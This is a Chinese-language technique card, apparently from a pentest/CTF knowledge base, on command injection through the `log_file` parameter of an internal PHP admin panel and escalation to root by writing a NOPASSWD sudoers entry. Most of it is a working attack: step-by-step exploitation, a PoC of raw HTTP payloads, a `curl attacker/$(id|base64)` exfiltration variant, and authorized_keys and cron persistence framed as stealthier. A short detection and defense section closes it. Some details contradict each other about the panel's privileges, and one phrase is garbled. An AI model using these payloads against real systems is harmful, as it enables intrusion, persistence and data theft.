---
id: web-php-rce-monitor-log-file-param-shell-write-sudoers-root
title: 内网运维面板 log_file 参数拼进 shell 命令：先 `;id;#` 打通命令执行，再写 sudoers 换 root
type: scenario
domain: web
path: web/php/rce
technique: php-admin-panel-log-param-command-injection-sudoers-escalation
aliases:
- System Monitor log_file 注入
- log_file=;id;#
- 写 sudoers 提权
- 内网运维面板命令注入
tags:
- php
- command-injection
- ctf
- privilege-escalation
- sudoers
- internal-panel
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W2
  verified_at: '2026-11-08T12:18:16+08:00'
  notes: '已对照原文核对：面板为 PHP 7.4.3-4ubuntu2.23 + Basic realm=Restricted Area、log_file 表单值拼 shell、先 401 后 log_file=;id;# 打通并有回显（/etc/passwd 回显在 pre 块）、%2Fvar%2Flog%2Fapache2%2Faccess.log 读到 access.log、%26%26 组合 echo 写 /etc/sudoers.d/amay、amay sudo -l 显示 (ALL) NOPASSWD: ALL 后 sudo -s 拿 root，均与原文与截图一致；关联 [[pentest-privilege-escalation-linux-sudo-nopasswd]] 为失效链（卡片不存在），已改为实际存在的 sudoers 追加提权卡；原文未标注组件版本，未设 affected_versions；靶机 PoC 未复跑'
---

## 一句话结论

内网运维面板的“日志分析”功能把下拉框的 `log_file` 值直接拼进 shell 命令（如 `tail/grep <log_file>`），只做了 Basic 认证；用 `log_file=;id;#` 即可截断原命令执行任意命令，再用 `cat /etc/passwd | grep` 回显确认结果可控，最后以 root 权限的 Web 进程写入 `/etc/sudoers.d/amay` 里的 `(ALL) NOPASSWD: ALL`，普通用户 `amay` 执行 `sudo -s` 直接拿 root。

## 原理

- **拼接点**：面板代码大致是 `$cmd = "grep '<pattern>' {$log_file}"` 或 `$cmd = "tail -n 100 {$log_file}"`，`log_file` 来自 `<select name="log_file">` 的表单值（还有 `&analyze_log=` 按钮名）。服务端未做白名单，PHP 用 `shell_exec`/`system` 执行整串。
- **截断与注释**：`;` 让前一条命令结束，`#` 注释掉原命令尾部的引号/参数，因此 `;id;#` 的语义是“先执行 `id`，把后面的垃圾全部注释”。这是最常见的 shell 注入语法，不需要逃逸单双引号。
- **为什么能回显**：面板把命令输出直接渲染在页面 `<pre>` 里（原文截图里 `/etc/passwd:` 与 `_laurel:...` 被回显成 “Suspicious traffic patterns detected in ...” 的提示），因此是“有回显的命令注入”，不需要反弹或时间盲注。
- **提权路径**：Web 进程是 root（面板以 root 运行），所以命令注入已经是 root 上下文；但更稳的做法是把 `amay` 加进 sudoers：`echo "amay ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/amay`，之后用普通 SSH 用户 `amay` 执行 `sudo -s` 即得 root shell（原文的最终 root 就来自这一步，而不是面板本身）。
- **为什么要多这一步**：直接靠面板注入的 shell 是 www-data/服务账户上下文，一旦面板重启或会话失效就断；在 `/etc/sudoers.d/` 落一个持久化授权，等于把 Web 漏洞转化成稳定的系统级权限。
- **参数污染提示**：原文先试 `log_file=;id;#` 与 `/etc/passwd;sleep 0` 等变体确认注入点，再用 `%26%26`（即 `&&`）构造“把 `/etc/passwd` 内容与 `echo` 写 sert 组合”的 payload，说明 `&`/`;`/`#` 都可用，且 `log_file` 的编码需按 `application/x-www-form-urlencoded` 处理。

## 触发条件

- 面板的日志分析/日志查看功能把用户可控的 `log_file`（或 `file`、`path`、`log`）直接拼进 `shell_exec`/`system`/`exec`/反引号。
- 面板能被访问（内网 127.0.0.1:8080 之类），或可通过 SSRF/chisel 代理从外网打到。
- 面板具有执行权限（能读 `/etc/passwd`、能写 `/etc/sudoers.d/`）。
- 目标存在一个可用普通账户（本例 `amay`，来自 WonderCMS `database.js` 的 bcrypt 哈希破解）用于最后 `sudo -s`。

## 利用步骤

1. 探测面板：访问 `http://127.0.0.1:8080/`（原文通过 chisel 反向隧道 `R:9090:127.0.0.1:8080` 把内网端口映射到本地），确认是 PHP 面板且有 Basic 认证（`WWW-Authenticate: Basic realm="Restricted Area"`）。
2. 用已获得的凭据（或爆破）通过 Basic 认证。
3. 在“Analyze Log File”表单里把 `log_file` 改成 `;id;#`，观察响应里是否出现 `uid=...` 输出。
4. 若回显被过滤，改用 `log_file=;cat /etc/passwd | head -5;#`；仍无回显则用 `;sleep 5;#` 做时间盲注确认。
5. 读 `/etc/passwd` 找到可登录用户（如 `amay`），把手上的 bcrypt 哈希用 hashcat `-m 3200` 破解出 SSH 口令。
6. 以该用户 SSH 登录，`sudo -l` 查看权限；若为 `(ALL) NOPASSWD: ALL`，`sudo -s` 直接 root。
7. 若 `sudo -l` 无权限，回到面板注入点写 `;echo "amay ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/amay;#`，再在 SSH 会话里 `sudo -s`。
8. 取 `root.txt` / flag，并清理 `/etc/sudoers.d/` 里写入的文件。

## PoC

```text
# 1) Basic 认证后，截断原命令
POST / HTTP/1.1
Host: 127.0.0.1:8080
Authorization: Basic <base64>
Content-Type: application/x-www-form-urlencoded

log_file=;id;#&analyze_log=

# 2) 读 /etc/passwd 找可登录账户
log_file=;cat /etc/passwd | grep sh$;#&analyze_log=

# 3) 写入持久化 sudo 授权（面板以 root 运行）
log_file=;echo "amay ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/amay;#&analyze_log=

# 4) 以 amay 登录后
sudo -l        # 应显示 (ALL) NOPASSWD: ALL
sudo -s        # root shell
```

## 变体与关联

- 变体：`log_file` 被 `<select>` 限定为固定选项时，抓包改值即可；某些实现会先 `basename()` 再拼，此时换 `log_file=/etc/passwd;id` 让 `basename` 只切掉路径前缀但保留注入字符。
- 变体：无回显时用 `;ping -c 1 <dnslog>;#` 或 `;sleep 5;#` 做带外/时间盲注确认，再逐步用 `;curl attacker/$(id|base64);#` 把结果外带。
- 变体：提权面也可以是 `authorized_keys`（`;echo <pubkey> >> /root/.ssh/authorized_keys;#`）或 crontab（`;echo '* * * * * root ...' > /etc/cron.d/x;#`），比 sudoers 更隐蔽。
- 关联：[[web-php-rce-command-injection-blacklist-base64-tee-webshell]]（同类拼接点被黑名单拦时的绕过）、[[pentest-privilege-escalation-sudo-nopasswd-append-file-sudoers]]（同类「可写 sudoers 即提权 root」的通用复现）、前一步入口见同批次的 WonderCMS 主题安装卡。

## 检测与防御

- 修复：`log_file` 必须与下拉框允许值做白名单比对，或改成用 `escapeshellarg` + 固定目录拼接；禁止把请求参数拼进 shell 命令。
- 加固：面板不要以 root 运行；`/etc/sudoers.d/` 目录只允许 root 写并启用 `visudo -c` 校验；对日志分析类功能用只读受限账户。
- 检测：访问日志中出现 `log_file=` 后带 `;`、`#`、`&&`、`$(`、反引号；面板进程产生 `id`/`cat`/`echo` 子进程；`/etc/sudoers.d/` 新增文件或 mtime 变化（auditd 对 `/etc/sudoers*` 加 watch）。
- 响应：删除恶意 sudoers/authorized_keys/cron 条目，把面板与 Web 进程降权重启，轮换所有从面板泄露的凭据（`data/database.js` 里的 bcrypt 哈希按已泄露处理）。
